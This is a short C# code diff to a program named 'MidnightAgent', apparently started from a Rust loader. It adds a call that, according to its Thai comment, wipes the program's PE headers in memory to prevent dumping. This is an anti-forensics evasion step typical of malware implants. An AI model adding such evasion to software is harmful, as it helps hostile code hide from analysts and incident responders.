@@ -17,6 +17,9 @@ namespace MidnightAgent
         // Returns 0 on success, other values on failure
         public static int Run(string argument)
         {
+            // ทำลาย PE Headers ในแรมทันทีเพื่อป้องกันการ Dump
+            Security.AntiDump.StompHeader();
+
             // When called from Rust loader, skip installation logic
             // and go straight to running the agent with retry loop
             using (var mutex = new Mutex(true, "MidnightAgent_Mutex", out bool isNew))
